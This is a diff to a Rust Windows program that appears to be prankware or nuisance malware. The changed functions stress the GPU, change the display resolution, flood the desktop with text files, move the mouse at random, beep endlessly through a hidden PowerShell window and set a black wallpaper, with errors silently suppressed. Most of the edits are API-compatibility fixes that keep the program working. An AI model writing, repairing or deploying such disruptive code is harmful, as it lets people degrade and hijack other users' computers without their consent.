@@ -2,6 +2,7 @@ use argon2::{Algorithm, Argon2, Params, Version};
 use rand::Rng;
 use std::fs;
 use std::mem;
+use std::os::windows::ffi::OsStrExt;
 use std::path::PathBuf;
 use std::process::Command;
 use std::sync::Arc;
@@ -15,21 +16,20 @@ use windows::Win32::Devices::Display::{
 };
 use windows::Win32::Foundation::{BOOL, LPARAM, RECT};
 use windows::Win32::Graphics::Gdi::{
-    EnumDisplayMonitors, GetMonitorInfoW, MonitorFromWindow, MONITORINFOEXW,
-    MONITOR_DEFAULTTOPRIMARY, HDC, HMONITOR,
+    EnumDisplayMonitors, GetMonitorInfoW, MONITORINFOEXW,
+    HDC, HMONITOR,
     DEVMODEW, EnumDisplaySettingsW, ChangeDisplaySettingsW, CDS_RESET,
     DISP_CHANGE_SUCCESSFUL, DM_PELSWIDTH, DM_PELSHEIGHT,
+    ENUM_DISPLAY_SETTINGS_MODE,
 };
 use windows::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
 use windows::Win32::UI::Input::KeyboardAndMouse::{
     ActivateKeyboardLayout, LoadKeyboardLayoutW, KLF_ACTIVATE,
-    SetCursorPos,
 };
-use windows::Win32::UI::TextServices::HKL;
 use windows::Win32::UI::WindowsAndMessaging::{
-    MessageBeep, MB_ICONWARNING,
     SystemParametersInfoW, SPI_SETDESKWALLPAPER, SPIF_UPDATEINIFILE,
     GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN,
+    SetCursorPos,
 };
 
 const SHADER_SRC: &str = r#"
@@ -161,13 +161,13 @@ fn gpuStressWithSize(size: u64) -> Result<(), Box<dyn std::error::Error>> {
 fn gpuStress() {
     match gpuStressWithSize(16_000_000) {
         Ok(_) => return,
-        Err(e) => eprintln!(),
+        Err(_e) => eprintln!(),
     }
     match gpuStressWithSize(8_000_000) {
         Ok(_) => return,
-        Err(e) => eprintln!(),
+        Err(_e) => eprintln!(),
     }
-    if let Err(e) = gpuStressWithSize(4_000_000) {
+    if let Err(_e) = gpuStressWithSize(4_000_000) {
         eprintln!();
     }
 }
@@ -279,7 +279,7 @@ fn getResolutions() -> Vec<(i32, i32)> {
         loop {
             let mut devmode: DEVMODEW = mem::zeroed();
             devmode.dmSize = mem::size_of::<DEVMODEW>() as u16;
-            let res = EnumDisplaySettingsW(None, modeNum, &mut devmode);
+            let res = EnumDisplaySettingsW(None, ENUM_DISPLAY_SETTINGS_MODE(modeNum), &mut devmode);
             if !res.as_bool() {
                 break;
             }
@@ -305,7 +305,7 @@ fn setResolution(width: i32, height: i32) -> bool {
         devmode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
         devmode.dmPelsWidth = width as u32;
         devmode.dmPelsHeight = height as u32;
-        let result = ChangeDisplaySettingsW(&devmode, CDS_RESET);
+        let result = ChangeDisplaySettingsW(Some(&devmode), CDS_RESET);
         result == DISP_CHANGE_SUCCESSFUL
     }
 }
@@ -353,7 +353,7 @@ fn createHelloFiles() {
         let filename = format!("helloworld{}.txt", i);
         let path = desktop.join(filename);
         let content = format!("Hello World {}", i);
-        if let Err(e) = fs::write(&path, content) {
+        if let Err(_e) = fs::write(&path, content) {
             eprintln!();
         }
     }
@@ -371,7 +371,9 @@ fn moveMouseRandomly() {
 
 fn beepLoop() {
     loop {
-        unsafe { MessageBeep(MB_ICONWARNING); }
+        let _ = Command::new("powershell")
+            .args(["-WindowStyle", "Hidden", "-Command", "[console]::beep(750,300)"])
+            .status();
         thread::sleep(Duration::from_millis(500));
     }
 }
@@ -405,7 +407,7 @@ fn setBlackWallpaper() {
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     ];
-    if let Err(e) = fs::write(&bmpPath, bmpData) {
+    if let Err(_e) = fs::write(&bmpPath, bmpData) {
         eprintln!();
         return;
     }
@@ -418,7 +420,7 @@ fn setBlackWallpaper() {
         SystemParametersInfoW(
             SPI_SETDESKWALLPAPER,
             0,
-            wide.as_ptr() as *mut _,
+            Some(wide.as_ptr() as *mut _),
             SPIF_UPDATEINIFILE,
         );
     }
